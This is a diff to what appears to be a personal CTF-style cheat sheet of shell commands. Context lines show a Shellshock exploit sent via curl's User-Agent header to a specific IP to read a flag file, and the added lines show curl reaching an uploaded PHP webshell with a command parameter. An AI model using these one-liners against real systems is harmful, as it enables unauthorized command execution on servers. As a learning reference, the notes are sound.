@@ -365,6 +365,11 @@ curl 3.95.14.86:10702/cgi-bin/board -H "User-Agent:() { :; }; echo 'Content-Type
 curl 3.95.14.86:10702/cgi-bin/board -H "User-Agent:() { :; }; echo 'Content-Type: text/plain'; echo ; /bin/bash -c "/bin/cat flag"
 ```
 
+* Using `curl` to access a webshell, `-k` is for insecure connection. By default `curl` verifies every `SSL` connection.
+```bash
+curl -k https://127.0.0.1/uploads/shell.php?cmd=whoami
+```
+
 * Recursively change the owner and group of a directory
 ```bash
 sudo chown -R saccharide:saccharide DIR/
